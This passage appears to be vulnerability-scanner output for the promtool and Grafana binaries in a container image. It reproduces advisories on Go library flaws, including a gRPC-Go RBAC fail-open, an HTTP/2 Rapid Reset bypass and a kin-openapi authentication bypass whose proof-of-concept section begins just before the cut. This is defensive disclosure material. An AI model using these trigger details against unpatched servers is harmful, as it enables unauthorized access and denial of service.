│                       │     │                   unsafe by design, and has known security issues 
│                       │     ├ Description     : The golang.org/x/crypto/openpgp package is unsafe by design,
│                       │     │                   has numerous known security issues, is not maintained, and
│                       │     │                   should not be used.
│                       │     │                   
│                       │     │                   If you are required to interoperate with OpenPGP systems and
│                       │     │                   need a maintained package, consider
│                       │     │                   github.com/ProtonMail/go-crypto/openpgp which is a maintained
│                       │     │                    fork that aims to be a drop-in replacement for this
│                       │     │                   package. 
│                       │     ├ Severity        : UNKNOWN 
│                       │     ╰ References       ╭ [0]: https://go.dev/issue/44226 
│                       │                        ╰ [1]: https://pkg.go.dev/vuln/GO-2026-5932 
│                       ├ [1] ╭ VulnerabilityID : CVE-2026-46600 
│                       │     ├ VendorIDs        ─ [0]: GO-2026-5942 
│                       │     ├ PkgID           : golang.org/x/net@v0.55.0 
│                       │     ├ PkgName         : golang.org/x/net 
│                       │     ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/net@v0.55.0 
│                       │     │                  ╰ UID : f924e5a57022ddfb 
│                       │     ├ InstalledVersion: v0.55.0 
│                       │     ├ FixedVersion    : 0.56.0 
│                       │     ├ Status          : fixed 
│                       │     ├ Layer            ╭ Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300c
│                       │     │                  │         6997c001601e2a6e5af 
│                       │     │                  ╰ DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a172
│                       │     │                            e154f0b8ad928e980c9 
│                       │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-46600 
│                       │     ├ DataSource       ╭ ID  : govulndb 
│                       │     │                  ├ Name: The Go Vulnerability Database 
│                       │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
│                       │     ├ Fingerprint     : sha256:6cc129c68227e7c4e5a68a5566ec8e187e4d725a0f40f1906d960d
│                       │     │                   309aee43b3 
│                       │     ├ Title           : Parsing an invalid SVCB or HTTPS RR can panic when the size
│                       │     │                   of a param ... 
│                       │     ├ Description     : Parsing an invalid SVCB or HTTPS RR can panic when the size
│                       │     │                   of a parameter value overflows the message buffer. 
│                       │     ├ Severity        : UNKNOWN 
│                       │     ├ CweIDs           ─ [0]: CWE-125 
│                       │     ├ References       ╭ [0]: https://go.dev/cl/786345 
│                       │     │                  ├ [1]: https://go.dev/issue/79795 
│                       │     │                  ╰ [2]: https://pkg.go.dev/vuln/GO-2026-5942 
│                       │     ├ PublishedDate   : 2026-07-21T20:17:01.213Z 
│                       │     ╰ LastModifiedDate: 2026-07-23T18:27:48.877Z 
│                       ├ [2] ╭ VulnerabilityID : CVE-2026-56852 
│                       │     ├ VendorIDs        ─ [0]: GO-2026-5970 
│                       │     ├ PkgID           : golang.org/x/text@v0.38.0 
│                       │     ├ PkgName         : golang.org/x/text 
│                       │     ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/text@v0.38.0 
│                       │     │                  ╰ UID : cc7844dfa03c0f59 
│                       │     ├ InstalledVersion: v0.38.0 
│                       │     ├ FixedVersion    : 0.39.0 
│                       │     ├ Status          : fixed 
│                       │     ├ Layer            ╭ Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300c
│                       │     │                  │         6997c001601e2a6e5af 
│                       │     │                  ╰ DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a172
│                       │     │                            e154f0b8ad928e980c9 
│                       │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-56852 
│                       │     ├ DataSource       ╭ ID  : govulndb 
│                       │     │                  ├ Name: The Go Vulnerability Database 
│                       │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
│                       │     ├ Fingerprint     : sha256:bb529d3e0f7636f41453aa9e1e62f87d3f78b92967e09325851410
│                       │     │                   ba8b56e4fc 
│                       │     ├ Title           : A norm.Iter can enter an infinite loop when handling input
│                       │     │                   containing  ... 
│                       │     ├ Description     : A norm.Iter can enter an infinite loop when handling input
│                       │     │                   containing invalid UTF-8 bytes. 
│                       │     ├ Severity        : HIGH 
│                       │     ├ CweIDs           ─ [0]: CWE-835 
│                       │     ├ VendorSeverity   ─ azure: 3 
│                       │     ├ References       ╭ [0]: https://go.dev/cl/794100 
│                       │     │                  ├ [1]: https://go.dev/issue/80142 
│                       │     │                  ├ [2]: https://nvd.nist.gov/vuln/detail/CVE-2026-56852 
│                       │     │                  ╰ [3]: https://pkg.go.dev/vuln/GO-2026-5970 
│                       │     ├ PublishedDate   : 2026-07-21T20:17:02.867Z 
│                       │     ╰ LastModifiedDate: 2026-07-23T18:27:48.877Z 
│                       ╰ [3] ╭ VulnerabilityID : GHSA-hrxh-6v49-42gf 
│                             ├ PkgID           : google.golang.org/grpc@v1.81.1 
│                             ├ PkgName         : google.golang.org/grpc 
│                             ├ PkgIdentifier    ╭ PURL: pkg:golang/google.golang.org/grpc@v1.81.1 
│                             │                  ╰ UID : 6352336039511707 
│                             ├ InstalledVersion: v1.81.1 
│                             ├ FixedVersion    : 1.82.1 
│                             ├ Status          : fixed 
│                             ├ Layer            ╭ Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300c
│                             │                  │         6997c001601e2a6e5af 
│                             │                  ╰ DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a172
│                             │                            e154f0b8ad928e980c9 
│                             ├ SeveritySource  : ghsa 
│                             ├ PrimaryURL      : https://github.com/advisories/GHSA-hrxh-6v49-42gf 
│                             ├ DataSource       ╭ ID  : ghsa 
│                             │                  ├ Name: GitHub Security Advisory Go 
│                             │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ec
│                             │                          osystem%3Ago 
│                             ├ Fingerprint     : sha256:93bcc09e5c30d86101ba9a67bacf3149bc0b75eea0df1e03bbed56
│                             │                   7a841ef49d 
│                             ├ Title           : gRPC-Go: xDS RBAC and HTTP/2 Vulnerabilities 
│                             ├ Description     : Multiple security vulnerabilities have been identified and
│                             │                   addressed in grpc-go affecting the xDS RBAC authorization
│                             │                   engine (internal/xds/rbac) and the HTTP/2 transport server
│                             │                   implementation (internal/transport). These vulnerabilities
│                             │                   could result in:
│                             │                   
│                             │                   - Authorization Bypass (Fail-Open) when translating xDS RBAC
│                             │                   policies containing `Metadata` or `RequestedServerName`
│                             │                   fields.
│                             │                   - Denial of Service (High CPU Consumption) due to an HTTP/2
│                             │                   Rapid Reset mitigation bypass during client-initiated stream
│                             │                   resets.
│                             │                   - Denial of Service (Server Panic) when parsing crafted xDS
│                             │                   RBAC policies containing `NOT` rules around unsupported
│                             │                   ### Impact
│                             │                   _What kind of vulnerability is it? Who is impacted?_
│                             │                   #### xDS RBAC Authorization Bypass via `Metadata` &
│                             │                   `RequestedServerName` matchers
│                             │                   - Affected Component: xDS RBAC 
│                             │                   - Impact: When building policy matchers for gRPC RBAC from
│                             │                   xDS configurations, unsupported `permission` and `principal`
│                             │                   rules (specifically `Metadata` and `RequestedServerName`)
│                             │                   were silently ignored and treated as no-ops.
│                             │                     - If an authorization policy relied purely on these
│                             │                   matchers for access control, treating those rules as no-ops
│                             │                   effectively removed the restrictions.
│                             │                   - If these unsupported rules were nested inside logical `NOT`
│                             │                    rules (`Permission_NotRule` / `Principal_NotId`) or
│                             │                   multi-condition `OR/AND` rules, silently dropping them
│                             │                   changed the boolean logic flow of the authorization engine.
│                             │                   As a result, policy evaluation decisions could fail open,
│                             │                   allowing unauthorized clients to access protected gRPC
│                             │                   services or resources.
│                             │                   #### HTTP/2 Rapid Reset Mitigation Bypass / Denial of Service
│                             │                    via Stream Aborts
│                             │                   - Affected Component: HTTP/2 transport
│                             │                   - Impact: Earlier mitigations in grpc-go for HTTP/2 Rapid
│                             │                   Reset only applied threshold checks to items that directly
│                             │                   resulted in control frames being written back to the wire,
│                             │                   such as `SETTINGS` ACKs or server-initiated `RST_STREAM`s.
│                             │                   When a client initiated a rapid flood of stream creation
│                             │                   (`HEADERS`) immediately followed by stream termination
│                             │                   `RST_STREAM`, items queued up in the control buffer without
│                             │                   counting against the transport response frame threshold. An
│                             │                   attacker can repeatedly trigger this flood sequence to bypass
│                             │                    reader blocking, resulting in high CPU usage, and Denial of
│                             │                   Service (DoS).
│                             │                   #### Denial of Service (Panic) in xDS RBAC Engine via
│                             │                   Unsupported Fields inside NOT Rules
│                             │                   - Impact: The xDS RBAC policy translators recursively
│                             │                   generate matchers for nested rules. When a `NOT` rule wrapped
│                             │                    an unsupported or unhandled field (such as
│                             │                   `SourcedMetadata`), the recursive step returned an empty
│                             │                   matcher. This could result in a runtime panic when the RBAC
│                             │                   engine attempts to authorize an incoming request.
│                             │                   An attacker or misconfigured/malicious xDS management server
│                             │                   delivering an LDS/RDS update containing a `NOT` rule around
│                             │                   an unhandled field causes the gRPC server process to crash
│                             │                   immediately (CWE-248 / Denial of Service).
│                             │                   ### Patches
│                             │                   _Has the problem been patched? What versions should users
│                             │                   upgrade to?_
│                             │                   All three issues have been fixed in `master` and will be
│                             │                   released in 1.82.1 shortly.
│                             │                   ### Workarounds
│                             │                   _Is there a way for users to fix or remediate the
│                             │                   vulnerability without upgrading?_
│                             │                   If upgrading grpc-go immediately is not possible, apply the
│                             │                   following workarounds based on your deployment architecture:
│                             │                   * For xDS RBAC Vulnerabilities & Panics: Ensure that upstream
│                             │                    xDS management servers do not push RBAC policies containing
│                             │                   `Metadata`, `RequestedServerName`, or `NOT` rules wrapping
│                             │                   unsupported fields (such as `SourcedMetadata`) to grpc-go
│                             │                   servers.
│                             │                   * For HTTP/2 Rapid Reset DOS: Configure upstream reverse
│                             │                   proxies or load balancers (such as Envoy) with strict HTTP/2
│                             │                   `max_concurrent_streams` limits and active rate limiting on
│                             │                   `RST_STREAM` frequency per connection.
│                             │                   ### Severity
│                             │                     | Vulnerability | Qualitative Severity | Approximate CVSS
│                             │                   v3.1 Score | Primary Impact |
│                             │                     | :--- | :--- | :--- | :--- |
│                             │                     | **xDS RBAC Authorization Bypass** | **High** | `8.2` |
│                             │                   Unauthorized Access / Fail-Open |
│                             │                     | **HTTP/2 Rapid Reset DOS Bypass** | **High** | `7.5` |
│                             │                   High CPU Consumption / Denial of Service |
│                             │                     | **xDS RBAC Engine Server Panic** | **Medium** | `5.9` |
│                             │                   Process Crash / Denial of Service | 
│                             ├ Severity        : HIGH 
│                             ├ VendorSeverity   ─ ghsa: 3 
│                             ├ CVSS             ─ ghsa ╭ V40Vector: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:
│                             │                         │            H/VA:H/SC:N/SI:N/SA:N 
│                             │                         ╰ V40Score : 8.8 
│                             ├ References       ╭ [0]: https://github.com/grpc/grpc-go 
│                             │                  ├ [1]: https://github.com/grpc/grpc-go/commit/4ea465d4ab98013f
│                             │                  │      72a142fe0fc89c19770b2935 
│                             │                  ├ [2]: https://github.com/grpc/grpc-go/pull/9236 
│                             │                  ├ [3]: https://github.com/grpc/grpc-go/releases/tag/v1.82.1 
│                             │                  ╰ [4]: https://github.com/grpc/grpc-go/security/advisories/GHS
│                             │                         A-hrxh-6v49-42gf 
│                             ├ PublishedDate   : 2026-07-21T22:03:55Z 
│                             ╰ LastModifiedDate: 2026-07-21T22:03:56Z 
├ [5] ╭ Target         : usr/bin/promtool 
│     ├ Class          : lang-pkgs 
│     ├ Type           : gobinary 
│     ├ Packages        
│     ╰ Vulnerabilities ╭ [0] ╭ VulnerabilityID : GO-2026-5932 
│                       │     ├ PkgID           : golang.org/x/crypto@v0.52.0 
│                       │     ├ PkgName         : golang.org/x/crypto 
│                       │     ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/crypto@v0.52.0 
│                       │     │                  ╰ UID : e59a4f7d0abf5558 
│                       │     ├ InstalledVersion: v0.52.0 
│                       │     ├ Status          : affected 
│                       │     ├ Layer            ╭ Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300c
│                       │     │                  │         6997c001601e2a6e5af 
│                       │     │                  ╰ DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a172
│                       │     │                            e154f0b8ad928e980c9 
│                       │     ├ DataSource       ╭ ID  : govulndb 
│                       │     │                  ├ Name: The Go Vulnerability Database 
│                       │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
│                       │     ├ Fingerprint     : sha256:9b3b14cdc6625bdc4ef862e518323583e18aa2c8d3d1b87de1494e
│                       │     │                   88a5cbc58d 
│                       │     ├ Title           : The golang.org/x/crypto/openpgp package is unmaintained,
│                       │     │                   unsafe by design, and has known security issues 
│                       │     ├ Description     : The golang.org/x/crypto/openpgp package is unsafe by design,
│                       │     │                   has numerous known security issues, is not maintained, and
│                       │     │                   should not be used.
│                       │     │                   
│                       │     │                   If you are required to interoperate with OpenPGP systems and
│                       │     │                   need a maintained package, consider
│                       │     │                   github.com/ProtonMail/go-crypto/openpgp which is a maintained
│                       │     │                    fork that aims to be a drop-in replacement for this
│                       │     │                   package. 
│                       │     ├ Severity        : UNKNOWN 
│                       │     ╰ References       ╭ [0]: https://go.dev/issue/44226 
│                       │                        ╰ [1]: https://pkg.go.dev/vuln/GO-2026-5932 
│                       ├ [1] ╭ VulnerabilityID : CVE-2026-46600 
│                       │     ├ VendorIDs        ─ [0]: GO-2026-5942 
│                       │     ├ PkgID           : golang.org/x/net@v0.55.0 
│                       │     ├ PkgName         : golang.org/x/net 
│                       │     ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/net@v0.55.0 
│                       │     │                  ╰ UID : f9566a120c579957 
│                       │     ├ InstalledVersion: v0.55.0 
│                       │     ├ FixedVersion    : 0.56.0 
│                       │     ├ Status          : fixed 
│                       │     ├ Layer            ╭ Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300c
│                       │     │                  │         6997c001601e2a6e5af 
│                       │     │                  ╰ DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a172
│                       │     │                            e154f0b8ad928e980c9 
│                       │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-46600 
│                       │     ├ DataSource       ╭ ID  : govulndb 
│                       │     │                  ├ Name: The Go Vulnerability Database 
│                       │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
│                       │     ├ Fingerprint     : sha256:c6256e4459de2c5e49a0a31d632181dcfe4e5614717249370cd02b
│                       │     │                   c134c324bd 
│                       │     ├ Title           : Parsing an invalid SVCB or HTTPS RR can panic when the size
│                       │     │                   of a param ... 
│                       │     ├ Description     : Parsing an invalid SVCB or HTTPS RR can panic when the size
│                       │     │                   of a parameter value overflows the message buffer. 
│                       │     ├ Severity        : UNKNOWN 
│                       │     ├ CweIDs           ─ [0]: CWE-125 
│                       │     ├ References       ╭ [0]: https://go.dev/cl/786345 
│                       │     │                  ├ [1]: https://go.dev/issue/79795 
│                       │     │                  ╰ [2]: https://pkg.go.dev/vuln/GO-2026-5942 
│                       │     ├ PublishedDate   : 2026-07-21T20:17:01.213Z 
│                       │     ╰ LastModifiedDate: 2026-07-23T18:27:48.877Z 
│                       ├ [2] ╭ VulnerabilityID : CVE-2026-56852 
│                       │     ├ VendorIDs        ─ [0]: GO-2026-5970 
│                       │     ├ PkgID           : golang.org/x/text@v0.38.0 
│                       │     ├ PkgName         : golang.org/x/text 
│                       │     ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/text@v0.38.0 
│                       │     │                  ╰ UID : 9948c7061f564f61 
│                       │     ├ InstalledVersion: v0.38.0 
│                       │     ├ FixedVersion    : 0.39.0 
│                       │     ├ Status          : fixed 
│                       │     ├ Layer            ╭ Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300c
│                       │     │                  │         6997c001601e2a6e5af 
│                       │     │                  ╰ DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a172
│                       │     │                            e154f0b8ad928e980c9 
│                       │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-56852 
│                       │     ├ DataSource       ╭ ID  : govulndb 
│                       │     │                  ├ Name: The Go Vulnerability Database 
│                       │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
│                       │     ├ Fingerprint     : sha256:bc259fbb207d82143e3bb2dc8fdd60ea1f24aa0fd3a6ff755dae4e
│                       │     │                   1498dbb849 
│                       │     ├ Title           : A norm.Iter can enter an infinite loop when handling input
│                       │     │                   containing  ... 
│                       │     ├ Description     : A norm.Iter can enter an infinite loop when handling input
│                       │     │                   containing invalid UTF-8 bytes. 
│                       │     ├ Severity        : HIGH 
│                       │     ├ CweIDs           ─ [0]: CWE-835 
│                       │     ├ VendorSeverity   ─ azure: 3 
│                       │     ├ References       ╭ [0]: https://go.dev/cl/794100 
│                       │     │                  ├ [1]: https://go.dev/issue/80142 
│                       │     │                  ├ [2]: https://nvd.nist.gov/vuln/detail/CVE-2026-56852 
│                       │     │                  ╰ [3]: https://pkg.go.dev/vuln/GO-2026-5970 
│                       │     ├ PublishedDate   : 2026-07-21T20:17:02.867Z 
│                       │     ╰ LastModifiedDate: 2026-07-23T18:27:48.877Z 
│                       ╰ [3] ╭ VulnerabilityID : GHSA-hrxh-6v49-42gf 
│                             ├ PkgID           : google.golang.org/grpc@v1.81.1 
│                             ├ PkgName         : google.golang.org/grpc 
│                             ├ PkgIdentifier    ╭ PURL: pkg:golang/google.golang.org/grpc@v1.81.1 
│                             │                  ╰ UID : 73afc558a2cf1c6b 
│                             ├ InstalledVersion: v1.81.1 
│                             ├ FixedVersion    : 1.82.1 
│                             ├ Status          : fixed 
│                             ├ Layer            ╭ Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300c
│                             │                  │         6997c001601e2a6e5af 
│                             │                  ╰ DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a172
│                             │                            e154f0b8ad928e980c9 
│                             ├ SeveritySource  : ghsa 
│                             ├ PrimaryURL      : https://github.com/advisories/GHSA-hrxh-6v49-42gf 
│                             ├ DataSource       ╭ ID  : ghsa 
│                             │                  ├ Name: GitHub Security Advisory Go 
│                             │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ec
│                             │                          osystem%3Ago 
│                             ├ Fingerprint     : sha256:b110f5c53b68084eba70b0f5c25d5703b022924be4f4213b4f735a
│                             │                   db7e41bb6d 
│                             ├ Title           : gRPC-Go: xDS RBAC and HTTP/2 Vulnerabilities 
│                             ├ Description     : Multiple security vulnerabilities have been identified and
│                             │                   addressed in grpc-go affecting the xDS RBAC authorization
│                             │                   engine (internal/xds/rbac) and the HTTP/2 transport server
│                             │                   implementation (internal/transport). These vulnerabilities
│                             │                   could result in:
│                             │                   
│                             │                   - Authorization Bypass (Fail-Open) when translating xDS RBAC
│                             │                   policies containing `Metadata` or `RequestedServerName`
│                             │                   fields.
│                             │                   - Denial of Service (High CPU Consumption) due to an HTTP/2
│                             │                   Rapid Reset mitigation bypass during client-initiated stream
│                             │                   resets.
│                             │                   - Denial of Service (Server Panic) when parsing crafted xDS
│                             │                   RBAC policies containing `NOT` rules around unsupported
│                             │                   ### Impact
│                             │                   _What kind of vulnerability is it? Who is impacted?_
│                             │                   #### xDS RBAC Authorization Bypass via `Metadata` &
│                             │                   `RequestedServerName` matchers
│                             │                   - Affected Component: xDS RBAC 
│                             │                   - Impact: When building policy matchers for gRPC RBAC from
│                             │                   xDS configurations, unsupported `permission` and `principal`
│                             │                   rules (specifically `Metadata` and `RequestedServerName`)
│                             │                   were silently ignored and treated as no-ops.
│                             │                     - If an authorization policy relied purely on these
│                             │                   matchers for access control, treating those rules as no-ops
│                             │                   effectively removed the restrictions.
│                             │                   - If these unsupported rules were nested inside logical `NOT`
│                             │                    rules (`Permission_NotRule` / `Principal_NotId`) or
│                             │                   multi-condition `OR/AND` rules, silently dropping them
│                             │                   changed the boolean logic flow of the authorization engine.
│                             │                   As a result, policy evaluation decisions could fail open,
│                             │                   allowing unauthorized clients to access protected gRPC
│                             │                   services or resources.
│                             │                   #### HTTP/2 Rapid Reset Mitigation Bypass / Denial of Service
│                             │                    via Stream Aborts
│                             │                   - Affected Component: HTTP/2 transport
│                             │                   - Impact: Earlier mitigations in grpc-go for HTTP/2 Rapid
│                             │                   Reset only applied threshold checks to items that directly
│                             │                   resulted in control frames being written back to the wire,
│                             │                   such as `SETTINGS` ACKs or server-initiated `RST_STREAM`s.
│                             │                   When a client initiated a rapid flood of stream creation
│                             │                   (`HEADERS`) immediately followed by stream termination
│                             │                   `RST_STREAM`, items queued up in the control buffer without
│                             │                   counting against the transport response frame threshold. An
│                             │                   attacker can repeatedly trigger this flood sequence to bypass
│                             │                    reader blocking, resulting in high CPU usage, and Denial of
│                             │                   Service (DoS).
│                             │                   #### Denial of Service (Panic) in xDS RBAC Engine via
│                             │                   Unsupported Fields inside NOT Rules
│                             │                   - Impact: The xDS RBAC policy translators recursively
│                             │                   generate matchers for nested rules. When a `NOT` rule wrapped
│                             │                    an unsupported or unhandled field (such as
│                             │                   `SourcedMetadata`), the recursive step returned an empty
│                             │                   matcher. This could result in a runtime panic when the RBAC
│                             │                   engine attempts to authorize an incoming request.
│                             │                   An attacker or misconfigured/malicious xDS management server
│                             │                   delivering an LDS/RDS update containing a `NOT` rule around
│                             │                   an unhandled field causes the gRPC server process to crash
│                             │                   immediately (CWE-248 / Denial of Service).
│                             │                   ### Patches
│                             │                   _Has the problem been patched? What versions should users
│                             │                   upgrade to?_
│                             │                   All three issues have been fixed in `master` and will be
│                             │                   released in 1.82.1 shortly.
│                             │                   ### Workarounds
│                             │                   _Is there a way for users to fix or remediate the
│                             │                   vulnerability without upgrading?_
│                             │                   If upgrading grpc-go immediately is not possible, apply the
│                             │                   following workarounds based on your deployment architecture:
│                             │                   * For xDS RBAC Vulnerabilities & Panics: Ensure that upstream
│                             │                    xDS management servers do not push RBAC policies containing
│                             │                   `Metadata`, `RequestedServerName`, or `NOT` rules wrapping
│                             │                   unsupported fields (such as `SourcedMetadata`) to grpc-go
│                             │                   servers.
│                             │                   * For HTTP/2 Rapid Reset DOS: Configure upstream reverse
│                             │                   proxies or load balancers (such as Envoy) with strict HTTP/2
│                             │                   `max_concurrent_streams` limits and active rate limiting on
│                             │                   `RST_STREAM` frequency per connection.
│                             │                   ### Severity
│                             │                     | Vulnerability | Qualitative Severity | Approximate CVSS
│                             │                   v3.1 Score | Primary Impact |
│                             │                     | :--- | :--- | :--- | :--- |
│                             │                     | **xDS RBAC Authorization Bypass** | **High** | `8.2` |
│                             │                   Unauthorized Access / Fail-Open |
│                             │                     | **HTTP/2 Rapid Reset DOS Bypass** | **High** | `7.5` |
│                             │                   High CPU Consumption / Denial of Service |
│                             │                     | **xDS RBAC Engine Server Panic** | **Medium** | `5.9` |
│                             │                   Process Crash / Denial of Service | 
│                             ├ Severity        : HIGH 
│                             ├ VendorSeverity   ─ ghsa: 3 
│                             ├ CVSS             ─ ghsa ╭ V40Vector: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:
│                             │                         │            H/VA:H/SC:N/SI:N/SA:N 
│                             │                         ╰ V40Score : 8.8 
│                             ├ References       ╭ [0]: https://github.com/grpc/grpc-go 
│                             │                  ├ [1]: https://github.com/grpc/grpc-go/commit/4ea465d4ab98013f
│                             │                  │      72a142fe0fc89c19770b2935 
│                             │                  ├ [2]: https://github.com/grpc/grpc-go/pull/9236 
│                             │                  ├ [3]: https://github.com/grpc/grpc-go/releases/tag/v1.82.1 
│                             │                  ╰ [4]: https://github.com/grpc/grpc-go/security/advisories/GHS
│                             │                         A-hrxh-6v49-42gf 
│                             ├ PublishedDate   : 2026-07-21T22:03:55Z 
│                             ╰ LastModifiedDate: 2026-07-21T22:03:56Z 
├ [6] ╭ Target         : usr/share/grafana/bin/grafana 
│     ├ Class          : lang-pkgs 
│     ├ Type           : gobinary 
│     ├ Packages        
│     ╰ Vulnerabilities ╭ [0] ╭ VulnerabilityID : GHSA-r277-6w6q-xmqw 
│                       │     ├ PkgID           : github.com/getkin/kin-openapi@v0.140.0 
│                       │     ├ PkgName         : github.com/getkin/kin-openapi 
│                       │     ├ PkgIdentifier    ╭ PURL: pkg:golang/github.com/getkin/kin-openapi@v0.140.0 
│                       │     │                  ╰ UID : 569a48646b538692 
│                       │     ├ InstalledVersion: v0.140.0 
│                       │     ├ FixedVersion    : 0.144.0 
│                       │     ├ Status          : fixed 
│                       │     ├ Layer            ╭ Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300c
│                       │     │                  │         6997c001601e2a6e5af 
│                       │     │                  ╰ DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a172
│                       │     │                            e154f0b8ad928e980c9 
│                       │     ├ SeveritySource  : ghsa 
│                       │     ├ PrimaryURL      : https://github.com/advisories/GHSA-r277-6w6q-xmqw 
│                       │     ├ DataSource       ╭ ID  : ghsa 
│                       │     │                  ├ Name: GitHub Security Advisory Go 
│                       │     │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ec
│                       │     │                          osystem%3Ago 
│                       │     ├ Fingerprint     : sha256:9313f2ff362d213d5259a07daaac3c17bc64892aa8a0a0450d1c96
│                       │     │                   dae769bcda 
│                       │     ├ Title           : kin-openapi: ValidationHandler.Load() Fail-Open
│                       │     │                   Authentication Bypass via NoopAuthenticationFunc Default 
│                       │     ├ Description     : ### Summary
│                       │     │                   `ValidationHandler.Load()` in `getkin/kin-openapi` silently
│                       │     │                   replaces a nil `AuthenticationFunc` with
│                       │     │                   `NoopAuthenticationFunc`, which always returns `nil` without
│                       │     │                   performing any credential check. Because this substitution
│                       │     │                   happens unconditionally when the caller omits the field,
│                       │     │                   every OpenAPI `security` requirement declared in the spec is
│                       │     │                   silently satisfied for unauthenticated requests. An
│                       │     │                   unauthenticated remote attacker can reach handlers for routes
│                       │     │                    whose OpenAPI operation requires an API key, OAuth token, or
│                       │     │                    any other security scheme if the application relies on
│                       │     │                   `ValidationHandler` as its enforcement middleware. 
│                       │     │                   
│                       │     │                   ### Details
│                       │     │                   `ValidationHandler` is an HTTP middleware exported by
│                       │     │                   `openapi3filter` that validates incoming requests and
│                       │     │                   responses against a loaded OpenAPI specification. Its
│                       │     │                   `Load()` method initialises default fields before the handler
│                       │     │                    begins serving:
│                       │     │                   ```go
│                       │     │                   // openapi3filter/validation_handler.go:47-49
│                       │     │                   if h.AuthenticationFunc == nil {
│                       │     │                       h.AuthenticationFunc = NoopAuthenticationFunc
│                       │     │                   }
│                       │     │                   ```
│                       │     │                   `NoopAuthenticationFunc` is defined as:
│                       │     │                   // openapi3filter/validation_handler.go:17-18
│                       │     │                   func NoopAuthenticationFunc(context.Context,
│                       │     │                   *AuthenticationInput) error { return nil }
│                       │     │                   It always returns `nil`, meaning every security scheme check
│                       │     │                   it handles is automatically approved.
│                       │     │                   When a request arrives, `ServeHTTP` → `before` →
│                       │     │                   `validateRequest` assembles a `RequestValidationInput` with
│                       │     │                   the current `AuthenticationFunc` (now the no-op) injected
│                       │     │                   into `Options`:
│                       │     │                   // openapi3filter/validation_handler.go:91-103
│                       │     │                   options := &Options{
│                       │     │                       AuthenticationFunc: h.AuthenticationFunc,
│                       │     │                   requestValidationInput := &RequestValidationInput{
│                       │     │                       Request:    r,
│                       │     │                       PathParams: pathParams,
│                       │     │                       Route:      route,
│                       │     │                       Options:    options,
│                       │     │                   if err = ValidateRequest(r.Context(),
│                       │     │                   requestValidationInput); err != nil {
│                       │     │                       return err
│                       │     │                   Inside `ValidateRequest`, each security requirement calls
│                       │     │                   `options.AuthenticationFunc`:
│                       │     │                   // openapi3filter/validate_request.go:436-438
│                       │     │                   f := options.AuthenticationFunc
│                       │     │                   if f == nil {
│                       │     │                       return ErrAuthenticationServiceMissing   // fail-closed
│                       │     │                   path — never reached via ValidationHandler
│                       │     │                   // ...
│                       │     │                   // openapi3filter/validate_request.go:497-503
│                       │     │                   if err := f(ctx, &AuthenticationInput{...}); err != nil {
│                       │     │                   Because `f` is the no-op (not `nil`), the
│                       │     │                   `ErrAuthenticationServiceMissing` guard is never triggered
│                       │     │                   and `f(...)` returns `nil`, clearing the security
│                       │     │                   requirement. Control then proceeds to the protected handler
│                       │     │                   (`validation_handler.go:61-62`).
│                       │     │                   The critical contradiction is that callers who use
│                       │     │                   `ValidateRequest` directly with a nil `AuthenticationFunc`
│                       │     │                   get fail-closed behavior (`ErrAuthenticationServiceMissing`),
│                       │     │                    while callers who use the higher-level `ValidationHandler`
│                       │     │                   with a nil `AuthenticationFunc` get fail-open behavior. Since
│                       │     │                    omitting `AuthenticationFunc` is the natural default, the
│                       │     │                   majority of real-world integrations are vulnerable.
│                       │     │                   Affected source file and line:
│                       │     │                   `openapi3filter/validation_handler.go:47–49` (commit
│                       │     │                   `30e2923`, tag `v0.143.0`).
│                       │     │                   ### PoC
│                       │     │                   **Environment**
│                       │     │                   Docker (any version supporting multi-stage builds)
│                       │     │                   Go 1.25 (inside the container via golang:1.25-alpine)
│                       │     │                   getkin/kin-openapi v0.143.0 (local source copy)
│                       │     │                   **Step 1 — Build the Docker image**
│                       │     │                   From the repository root (parent of `vuln-001/`):
│                       │     │                   ```bash
│                       │     │                   docker build \
│                       │     │                     -t vuln001-auth-bypass-poc \
│                       │     │                     -f vuln-001/Dockerfile \
│                       │     │                     reports/github_web_233_getkin__kin-openapi
│                       │     │                   The `Dockerfile` copies the local `kin-openapi` source into
│                       │     │                   `/kin-openapi/` inside the image and builds a Go binary
│                       │     │                   (`/poc-binary`) from `main.go`. The `go.mod` inside the image
│                       │     │                    uses a `replace` directive pointing to `/kin-openapi`, so no
│                       │     │                    network access to the Go module proxy is required.
│                       │     │                   **Step 2 — Run the container**
│                       │     │                   docker run --rm --network none vuln001-auth-bypass-poc
│                       │     │                   **Step 3 (alternative) — Use the Python helper**
│                       │     │                   python3 vuln-001/poc.py --no-cleanup
│                       │     │                   **What the PoC does**
